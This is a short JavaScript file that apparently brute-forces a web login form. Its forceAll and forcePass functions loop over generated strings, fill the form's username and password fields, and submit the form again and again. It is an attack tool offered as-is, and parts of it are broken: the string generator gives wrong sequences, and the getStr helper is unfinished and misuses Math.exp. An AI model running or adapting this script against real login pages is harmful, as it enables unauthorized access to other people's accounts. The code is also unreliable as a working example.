var charsets = [" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
	,"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"];
var changeName = function(value)
{
	document.forms[0].user.value=value
};
var changePass = function(value)
{
	document.forms[0].pass.value=value
};
var stringFromIndex = function(set,index)
{
	var string = '';
	var indexs = [];
	var remainingIndex = index;
	for (var i = 0; i < Math.floor(index/charsets[set].length); i++) {
		indexs[i] = remainingIndex
	};
	for(var j=0;j<=(index/charsets[set].length); j++)
	{
		var charNum = (index - j*charsets[set].length)%charsets[set].length;
		string += charsets[set].charAt(charNum);
	}
	return string;
}

function getStr(set, index){
	if(index < charsets[set].length){
		return charsets[set][index];
	} else {
		var str = '';
		var tmp = Math.ceil(
				index/Math.exp(charsets[set].length,
					Math.floor(Math.log10(index)/
						Math.log10(charsets[set].length))));
		console.log(tmp);
	}
}

var forceAll = function(set,depth)
{
	var pass = '';
	var name = '';
	for(var i = 0; i < depth*charsets[set].length; i++)
	{
		for(var j = 0; j < depth*charsets[set].length; j++)
		{
			name = stringFromIndex(set,i);
			pass = stringFromIndex(set,j);
			console.log(name+' : '+pass);
			changeName(name);
			changePass(pass);
			document.forms.login.submit();
		}
	}
};
var forcePass = function(set,depth)
{
	var pass = '';
	//var name = '';
	//for(var i = 0; i < depth*charsets[set].length; i++)
	//{
		for(var j = 0; j < depth*charsets[set].length; j++)
		{
			//name = stringFromIndex(set,i);
			pass = stringFromIndex(set,j);
			//console.log(name+' : '+pass);
			//changeName(name);
			changePass(pass);
			document.forms[0].submit();
		}
	//}
};